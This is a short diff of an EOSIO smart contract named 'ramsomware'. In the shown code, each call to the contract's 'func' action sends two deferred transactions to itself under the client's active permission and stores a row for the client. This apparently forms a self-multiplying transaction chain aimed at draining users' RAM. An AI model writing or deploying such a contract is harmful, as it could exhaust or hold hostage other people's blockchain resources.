@@ -40,13 +40,13 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             uint128_t initnum = 1;
             transaction out1{};
             transaction out2{};
-            out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client,  uint64_t(idx*2)) );
-            out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client, uint64_t(idx*2 +1)) );
+            //out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client,  uint64_t(idx*2)) );
+            //out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client, uint64_t(idx*2 +1)) );
             upsert(client, idx);
 
-            out1.actions.pop_back();
+            //out1.actions.pop_back();
             out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2) ));
-            out2.actions.pop_back();
+            //out2.actions.pop_back();
             out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2+1) ));
             //out.delay_sec = 0;
             out1.send(idx * 2, client, false);
